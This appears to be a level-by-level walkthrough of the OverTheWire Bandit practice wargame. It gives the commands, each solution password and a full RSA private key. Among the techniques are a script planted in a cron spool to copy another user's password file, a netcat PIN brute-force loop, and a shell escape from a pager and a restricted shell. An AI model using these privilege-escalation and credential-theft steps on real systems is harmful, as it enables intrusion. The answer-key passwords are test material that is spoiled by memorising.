# Level 0

ssh -p 2220 bandit0@bandit.labs.overthewire.org
bandit0

# Level 0 → Level 1

The password you are looking for is: ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If

# Level 1 → Level 2

ssh -p 2220 bandit1@bandit.labs.overthewire.org

cat ./-
263JGJPfgU6LtdEvgfWU1XP5yac29mFx

# Level 2 → Level 3

ssh -p 2220 bandit2@bandit.labs.overthewire.org

cat spaces\ in\ this\ filename
MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx

# Level 3 → Level 4

ssh -p 2220 bandit3@bandit.labs.overthewire.org

cat ...Hiding-From-You
2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ

# Level 4 → Level 5

ssh -p 2220 bandit4@bandit.labs.overthewire.org

```sh
for file in ./-file0{0..9}; do
    file "$file"
done
```

cat ./-file07
4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw

# Level 5 → Level 6

ssh -p 2220 bandit5@bandit.labs.overthewire.org

```sh
find . -type f -size 1033c ! -perm /111 -exec file {} + | grep "ASCII text"
```

cat maybehere07/.file2
HWasnPhtq9AVKe0dmk45nxy20cvUa6EG

# Level 6 → Level 7

ssh -p 2220 bandit6@bandit.labs.overthewire.org

find / -user bandit7 -group bandit6 -size 33c 2>/dev/null

cat /var/lib/dpkg/info/bandit7.password
morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj

# Level 7 → Level 8

ssh -p 2220 bandit7@bandit.labs.overthewire.org

grep "millionth" data.txt
millionth dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc

# Level 8 → Level 9

ssh -p 2220 bandit8@bandit.labs.overthewire.org

sort data.txt | uniq -c | grep " 1 "
1 4CKMh1JI91bUIZZPXDqGanal4xvAg0JM

# Level 9 → Level 10

ssh -p 2220 bandit9@bandit.labs.overthewire.org

strings data.txt | grep "^==="
========== FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey

# Level 10 → Level 11

ssh -p 2220 bandit10@bandit.labs.overthewire.org

bandit10@bandit:~$ cat data.txt
VGhlIHBhc3N3b3JkIGlzIGR0UjE3M2ZaS2IwUlJzREZTR3NnMlJXbnBOVmozcVJyCg==
bandit10@bandit:~$ echo "VGhlIHBhc3N3b3JkIGlzIGR0UjE3M2ZaS2IwUlJzREZTR3NnMlJXbnBOVmozcVJyCg==" | base64 -d
The password is dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr

# Level 11 → Level 12

ssh -p 2220 bandit11@bandit.labs.overthewire.org

cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
The password is 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4

# Level 12 → Level 13

ssh -p 2220 bandit12@bandit.labs.overthewire.org

```sh
temp_dir=$(mktemp -d)
echo "Temporary directory created at: $temp_dir"

cp data.txt $temp_dir

cd $temp_dir

bandit12@bandit:/tmp/gxuvimr$ xxd -r data.txt > data
bandit12@bandit:/tmp/gxuvimr$ ls
data  data.txt

bandit12@bandit:/tmp/gxuvimr$ file data
data: gzip compressed data, was "data2.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
bandit12@bandit:/tmp/gxuvimr$ mv data data.gz
bandit12@bandit:/tmp/gxuvimr$ gzip -d data.gz

bandit12@bandit:/tmp/gxuvimr$
bandit12@bandit:/tmp/gxuvimr$ file data
data: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/gxuvimr$ mv data data.bz2
bandit12@bandit:/tmp/gxuvimr$ bzip2 -d data.bz2

bandit12@bandit:/tmp/gxuvimr$ file data
data: gzip compressed data, was "data4.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
bandit12@bandit:/tmp/gxuvimr$ mv data data.gz
bandit12@bandit:/tmp/gxuvimr$ gzip -d data.gz

bandit12@bandit:/tmp/gxuvimr$ file data
data: POSIX tar archive (GNU)
bandit12@bandit:/tmp/gxuvimr$ mv data data.tar
bandit12@bandit:/tmp/gxuvimr$ tar -xvf data.tar
data5.bin
bandit12@bandit:/tmp/gxuvimr$ ls
data5.bin  data.tar  data.txt

bandit12@bandit:/tmp/gxuvimr$ file data5.bin
data5.bin: POSIX tar archive (GNU)
bandit12@bandit:/tmp/gxuvimr$ mv data5.bin data5.tar
bandit12@bandit:/tmp/gxuvimr$ tar -xvf data5.tar
data6.bin

bandit12@bandit:/tmp/gxuvimr$ file data6.bin
data6.bin: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/gxuvimr$ mv data6.bin data6.bz2
bandit12@bandit:/tmp/gxuvimr$ bzip2 -d data6.bz2

bandit12@bandit:/tmp/gxuvimr$ file data6
data6: POSIX tar archive (GNU)
bandit12@bandit:/tmp/gxuvimr$ mv data6 data6.tar
bandit12@bandit:/tmp/gxuvimr$ tar -xvf data6.tar
data8.bin

bandit12@bandit:/tmp/gxuvimr$ file data8.bin
data8.bin: gzip compressed data, was "data9.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
bandit12@bandit:/tmp/gxuvimr$ mv data8.bin data8.gz
bandit12@bandit:/tmp/gxuvimr$ gzip -d data8.gz

bandit12@bandit:/tmp/gxuvimr$ file data8
data8: ASCII text
bandit12@bandit:/tmp/gxuvimr$ cat data8
The password is FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn
```

# Level 13 → Level 14

ssh -p 2220 bandit13@bandit.labs.overthewire.org

cat sshkey.private

ssh -i sshkey.private -p 2220 bandit14@localhost

cat /etc/bandit_pass/bandit14
MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS

# Level 14 → Level 15

telnet localhost 30000

Correct!
8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo

# Level 15 → Level 16

ssh -i sshkey.private -p 2220 bandit15@localhost

openssl s_client -quiet -connect localhost:30001

Correct!
kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx

# Level 16 → Level 17

ssh -p 2220 bandit16@bandit.labs.overthewire.org

nmap -p 31000-32000 localhost

openssl s_client -connect localhost:31518

```sh
bandit16@bandit:~$ openssl s_client -quiet -connect localhost:31790
Can't use SSL_get_servername
depth=0 CN = SnakeOil
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = SnakeOil
verify return:1
kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----
```

# Level 17 → Level 18

ssh -i C:\Users\jesus\projects\other\otw\private\bandit17.txt -p 2220 bandit17@bandit.labs.overthewire.org

```sh
bandit17@bandit:~$ diff passwords.new passwords.old
42c42
< x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
---
> FtePUTiLiwPzjIFw2T7o57oBS4zUvPpg
```

# Level 18 → Level 19

ssh -p 2220 bandit18@bandit.labs.overthewire.org cat readme

cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8

# Level 19 → Level 20

ssh -p 2220 bandit19@bandit.labs.overthewire.org

ls -l

./bandit20-do cat /etc/bandit_pass/bandit20
0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO

# Level 20 → Level 21

ssh -p 2220 bandit20@bandit.labs.overthewire.org

```sh
bandit20@bandit:~$ ls
suconnect
bandit20@bandit:~$ nc -lvp 12345
Listening on 0.0.0.0 12345
Connection received on localhost 59664
0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
EeoULMCra2q0dSkYj561DX7s1CpBuOBt
bandit20@bandit:~$
```

```sh
bandit20@bandit:~$ ./suconnect 12345
Read: 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
Password matches, sending next password
```

EeoULMCra2q0dSkYj561DX7s1CpBuOBt

# Level 21 → Level 22

ssh -p 2220 bandit21@bandit.labs.overthewire.org

```sh
bandit21@bandit:~$ ls  /etc/cron.d
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  otw-tmp-dir  sysstat
bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
```

# Level 22 → Level 23

ssh -p 2220 bandit22@bandit.labs.overthewire.org

```sh
bandit22@bandit:~$ ls -la /etc/cron.d
total 44
drwxr-xr-x   2 root root  4096 Jun 20 04:08 .
drwxr-xr-x 121 root root 12288 Jun 20 21:05 ..
-rw-r--r--   1 root root   120 Jun 20 04:07 cronjob_bandit22
-rw-r--r--   1 root root   122 Jun 20 04:07 cronjob_bandit23
-rw-r--r--   1 root root   120 Jun 20 04:07 cronjob_bandit24
-rw-r--r--   1 root root   201 Apr  8 14:38 e2scrub_all
-rwx------   1 root root    52 Jun 20 04:08 otw-tmp-dir
-rw-r--r--   1 root root   102 Mar 31 00:06 .placeholder
-rw-r--r--   1 root root   396 Jan  9 20:31 sysstat
bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
```

# Level 23 → Level 24

ssh -p 2220 bandit23@bandit.labs.overthewire.org

```sh
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mkdir -p /tmp/poli
bandit23@bandit:~$ cd /tmp/poli

echo '#!/bin/bash' > /tmp/poli/my_script.sh
echo 'cat /etc/bandit_pass/bandit24 > /tmp/bandit23_pass.txt' >> /tmp/poli/my_script.sh

chmod +x /tmp/poli/my_script.sh

cp /tmp/poli/my_script.sh /var/spool/bandit24/foo/

cat /tmp/bandit23_pass.txt
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

# Level 24 → Level 25

ssh -p 2220 bandit24@bandit.labs.overthewire.org

```sh
bandit24@bandit:/tmp$ mktemp -d
/tmp/tmp.zoH1sk6a1R
bandit24@bandit:/tmp$ cd /tmp/tmp.zoH1sk6a1R
bandit24@bandit:/tmp/tmp.zoH1sk6a1R$ touch brute_force_pin.sh
bandit24@bandit:/tmp/tmp.zoH1sk6a1R$ chmod +x brute_force_pin.sh
bandit24@bandit:/tmp/tmp.zoH1sk6a1R$ nano brute_force_pin.sh
```

````sh
#!/bin/bash

for i in {0000..9999}
do
        echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> possibilities.txt
done

cat possibilities.txt | nc localhost 30002 > result.txt```
````

```sh
bandit24@bandit:/tmp/tmp.zoH1sk6a1R$ ./brute_force_pin.sh
bandit24@bandit:/tmp/tmp.zoH1sk6a1R$ ls
brute_force_pin.sh  possibilities.txt  result.txt
bandit24@bandit:/tmp/tmp.zoH1sk6a1R$ sort result.txt | grep -v "Wrong!"

Correct!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
bandit24@bandit:/tmp/tmp.zoH1sk6a1R$
```

# Level 25 → Level 26

ssh -p 2220 bandit25@bandit.labs.overthewire.org

```sh
cat /etc/passwd | grep bandit26
ls -la /usr/bin/showtext
cat /usr/bin/showtext
ls
chmod 700 bandit26.sshkey
# make the terminal window smaller
ssh -i bandit26.sshkey bandit26@localhost -p 2220
v
# make the terminal window bigger
:set shell=/bin/bash
:shell
bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
```

# Level 26 → Level 27

```sh
:shell
bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
bandit26@bandit:~$ ls
bandit27-do  text.txt
bandit26@bandit:~$ cat /etc/bandit\_pass/bandit26
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
bandit26@bandit:~$
bandit26@bandit:~$ bandit27-do
bandit27-do: command not found
bandit26@bandit:~$ ./bandit27-do
Run a command as another user.
  Example: ./bandit27-do id
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit\_pass/bandit27
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
```

# Level 27 → Level 28

ssh -p 2220 bandit27@bandit.labs.overthewire.org

```sh
bandit27@bandit:~$ mktemp -d
/tmp/tmp.U13ZQWNv0f
bandit27@bandit:~$ cd /tmp/tmp.U13ZQWNv0f
bandit27@bandit:/tmp/tmp.U13ZQWNv0f$ git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
bandit27@bandit:/tmp/tmp.U13ZQWNv0f$ ls
repo
bandit27@bandit:/tmp/tmp.U13ZQWNv0f$ cd repo/
bandit27@bandit:/tmp/tmp.U13ZQWNv0f/repo$ ls
README
bandit27@bandit:/tmp/tmp.U13ZQWNv0f/repo$ cat README
The password to the next level is: Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN
```

# Level 28 → Level 29

ssh -p 2220 bandit28@bandit.labs.overthewire.org

```sh
bandit28@bandit:~$ mktemp -d
/tmp/tmp.DQdqMNdbg3
bandit28@bandit:~$ cd /tmp/tmp.DQdqMNdbg3
bandit28@bandit:/tmp/tmp.DQdqMNdbg3$ git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repobandit28@bandit:/tmp/tmp.DQdqMNdbg3$ ls
repo
bandit28@bandit:/tmp/tmp.DQdqMNdbg3$ ls repo/
README.md
bandit28@bandit:/tmp/tmp.DQdqMNdbg3$ cat repo/README.md
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: xxxxxxxxxx

bandit28@bandit:/tmp/tmp.DQdqMNdbg3$
bandit28@bandit:/tmp/tmp.DQdqMNdbg3$ cd repo/
bandit28@bandit:/tmp/tmp.DQdqMNdbg3/repo$ git log
commit ad9a337071c5e3d4509559d36128b38a0e5571f1 (HEAD -> master, origin/master, origin/HEAD)
Author: Morla Porla <morla@overthewire.org>
Date:   Thu Jun 20 04:07:12 2024 +0000

    fix info leak

commit 229f6001e1ff407bb935b82a94c6749e41a0693e
Author: Morla Porla <morla@overthewire.org>
Date:   Thu Jun 20 04:07:12 2024 +0000

    add missing data

commit ea882192c25642e69627b13179f9fb98f409ed5d
Author: Ben Dover <noone@overthewire.org>
Date:   Thu Jun 20 04:07:12 2024 +0000

    initial commit of README.md
bandit28@bandit:/tmp/tmp.DQdqMNdbg3/repo$ git show ad9a33707
commit ad9a337071c5e3d4509559d36128b38a0e5571f1 (HEAD -> master, origin/master, origin/HEAD)
Author: Morla Porla <morla@overthewire.org>
Date:   Thu Jun 20 04:07:12 2024 +0000

    fix info leak

diff --git a/README.md b/README.md
index d4e3b74..5c6457b 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials

 - username: bandit29
-- password: 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7
+- password: xxxxxxxxxx

```

# Level 29 → Level 30

ssh -p 2220 bandit29@bandit.labs.overthewire.org

```sh
bandit29@bandit:~$ mktemp -d
/tmp/tmp.npkF48b4SE
bandit29@bandit:~$ cd /tmp/tmp.npkF48b4SE
bandit29@bandit:/tmp/tmp.npkF48b4SE$ git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
bandit29@bandit:/tmp/tmp.npkF48b4SE$ ls
repo
bandit29@bandit:/tmp/tmp.npkF48b4SE$ cd repo/
bandit29@bandit:/tmp/tmp.npkF48b4SE/repo$ ls -la
total 16
drwxrwxr-x 3 bandit29 bandit29 4096 Jul 17 02:28 .
drwx------ 3 bandit29 bandit29 4096 Jul 17 02:28 ..
drwxrwxr-x 8 bandit29 bandit29 4096 Jul 17 02:28 .git
-rw-rw-r-- 1 bandit29 bandit29  131 Jul 17 02:28 README.md
bandit29@bandit:/tmp/tmp.npkF48b4SE/repo$ cat README.md
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: <no passwords in production!>

bandit29@bandit:/tmp/tmp.npkF48b4SE/repo$ git log
commit a442ed81c95fac132590fdd218bd7b831db81fe4 (HEAD -> master, origin/master, origin/HEAD)
Author: Ben Dover <noone@overthewire.org>
Date:   Thu Jun 20 04:07:14 2024 +0000

    fix username

commit 046a4d27b46af8f02879c890972d7f125f3ab824
Author: Ben Dover <noone@overthewire.org>
Date:   Thu Jun 20 04:07:14 2024 +0000

    initial commit of README.md

bandit29@bandit:/tmp/tmp.npkF48b4SE/repo$ git branch -a
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/dev
  remotes/origin/master
  remotes/origin/sploits-dev
bandit29@bandit:/tmp/tmp.npkF48b4SE/repo$ git checkout dev
branch 'dev' set up to track 'origin/dev'.
Switched to a new branch 'dev'
bandit29@bandit:/tmp/tmp.npkF48b4SE/repo$ ls -la
total 20
drwxrwxr-x 4 bandit29 bandit29 4096 Jul 17 02:33 .
drwx------ 3 bandit29 bandit29 4096 Jul 17 02:28 ..
drwxrwxr-x 2 bandit29 bandit29 4096 Jul 17 02:33 code
drwxrwxr-x 8 bandit29 bandit29 4096 Jul 17 02:33 .git
-rw-rw-r-- 1 bandit29 bandit29  134 Jul 17 02:33 README.md
bandit29@bandit:/tmp/tmp.npkF48b4SE/repo$ cat README.md
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL

```

# Level 30 → Level 31

ssh -p 2220 bandit30@bandit.labs.overthewire.org

```sh
bandit30@bandit:~$ mktemp -d
/tmp/tmp.AKfrPbv5jm
bandit30@bandit:~$ cd /tmp/tmp.AKfrPbv5jm
bandit30@bandit:/tmp/tmp.AKfrPbv5jm$ git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo
bandit30@bandit:/tmp/tmp.AKfrPbv5jm$ cd repo
bandit30@bandit:/tmp/tmp.AKfrPbv5jm/repo$ ls -la
total 16
drwxrwxr-x 3 bandit30 bandit30 4096 Jul 17 02:36 .
drwx------ 3 bandit30 bandit30 4096 Jul 17 02:36 ..
drwxrwxr-x 8 bandit30 bandit30 4096 Jul 17 02:36 .git
-rw-rw-r-- 1 bandit30 bandit30   30 Jul 17 02:36 README.md
bandit30@bandit:/tmp/tmp.AKfrPbv5jm/repo$ cat README.md
just an epmty file... muahaha
bandit30@bandit:/tmp/tmp.AKfrPbv5jm/repo$ git log
commit 49ebc0513539a56d3626f3121ff4e72585064047 (HEAD -> master, origin/master, origin/HEAD)
Author: Ben Dover <noone@overthewire.org>
Date:   Thu Jun 20 04:07:17 2024 +0000

    initial commit of README.md
bandit30@bandit:/tmp/tmp.AKfrPbv5jm/repo$ git tag
secret
bandit30@bandit:/tmp/tmp.AKfrPbv5jm/repo$ git show secret
fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
```

# Level 31 → Level 32

ssh -p 2220 bandit31@bandit.labs.overthewire.org

```sh
bandit31@bandit:~$ mktemp -d
/tmp/tmp.MUXHCWa4LN
bandit31@bandit:~$ cd /tmp/tmp.MUXHCWa4LN
bandit31@bandit:/tmp/tmp.MUXHCWa4LN$ git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo
bandit31@bandit:/tmp/tmp.MUXHCWa4LN$ cd repo/
bandit31@bandit:/tmp/tmp.MUXHCWa4LN/repo$ ls -la
total 20
drwxrwxr-x 3 bandit31 bandit31 4096 Jul 17 02:39 .
drwx------ 3 bandit31 bandit31 4096 Jul 17 02:39 ..
drwxrwxr-x 8 bandit31 bandit31 4096 Jul 17 02:39 .git
-rw-rw-r-- 1 bandit31 bandit31    6 Jul 17 02:39 .gitignore
-rw-rw-r-- 1 bandit31 bandit31  147 Jul 17 02:39 README.md
bandit31@bandit:/tmp/tmp.MUXHCWa4LN/repo$ cat README.md
This time your task is to push a file to the remote repository.

Details:
    File name: key.txt
    Content: 'May I come in?'
    Branch: master

bandit31@bandit:/tmp/tmp.MUXHCWa4LN/repo$ git branch
* master
bandit31@bandit:/tmp/tmp.MUXHCWa4LN/repo$ echo 'May I come in?' > key.txt
bandit31@bandit:/tmp/tmp.MUXHCWa4LN/repo$ ls
key.txt  README.md
bandit31@bandit:/tmp/tmp.MUXHCWa4LN/repo$ cat .gitignore
*.txt
bandit31@bandit:/tmp/tmp.MUXHCWa4LN/repo$ git add -f key.txt
bandit31@bandit:/tmp/tmp.MUXHCWa4LN/repo$ git commit -a
Unable to create directory /home/bandit31/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

[master 86c769c] first commit
 1 file changed, 1 insertion(+)
 create mode 100644 key.txt
bandit31@bandit:/tmp/tmp.MUXHCWa4LN/repo$ git push -u origin mastergit push -u origin master
error: src refspec mastergit does not match any
error: src refspec push does not match any
error: failed to push some refs to 'ssh://localhost:2220/home/bandit31-git/repo'
bandit31@bandit:/tmp/tmp.MUXHCWa4LN/repo$ git status
On branch master
Your branch is ahead of 'origin/master' by 1 commit.
  (use "git push" to publish your local commits)

nothing to commit, working tree clean
bandit31@bandit:/tmp/tmp.MUXHCWa4LN/repo$ git push
The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/home/bandit31/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

bandit31-git@localhost's password:
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 2 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 321 bytes | 321.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
remote: ### Attempting to validate files... ####
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
remote: Well done! Here is the password for the next level:
remote: 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
To ssh://localhost:2220/home/bandit31-git/repo
 ! [remote rejected] master -> master (pre-receive hook declined)
error: failed to push some refs to 'ssh://localhost:2220/home/bandit31-git/repo'
```

3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K

# Level 32 → Level 33

ssh -p 2220 bandit32@bandit.labs.overthewire.org

```sh
WELCOME TO THE UPPERCASE SHELL
>> ls
sh: 1: LS: Permission denied
>> echo $0
sh: 1: ECHO: Permission denied
>> $0
$ ls -la
total 36
drwxr-xr-x  2 root     root      4096 Jun 20 04:07 .
drwxr-xr-x 70 root     root      4096 Jun 20 04:08 ..
-rw-r--r--  1 root     root       220 Mar 31 08:41 .bash_logout
-rw-r--r--  1 root     root      3771 Mar 31 08:41 .bashrc
-rw-r--r--  1 root     root       807 Mar 31 08:41 .profile
-rwsr-x---  1 bandit33 bandit32 15136 Jun 20 04:07 uppershell
$ whoami
bandit33
$ cat /etc/bandit\_pass/bandit33
tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
```

# Level 33 → Level 34

ssh -p 2220 bandit33@bandit.labs.overthewire.org

```sh
bandit33@bandit:~$ ls
README.txt
bandit33@bandit:~$ cat README.txt
Congratulations on solving the last level of this game!

At this moment, there are no more levels to play in this game. However, we are constantly working
on new levels and will most likely expand this game with more levels soon.
Keep an eye out for an announcement on our usual communication channels!
In the meantime, you could play some of our other wargames.

If you have an idea for an awesome new level, please let us know!
```
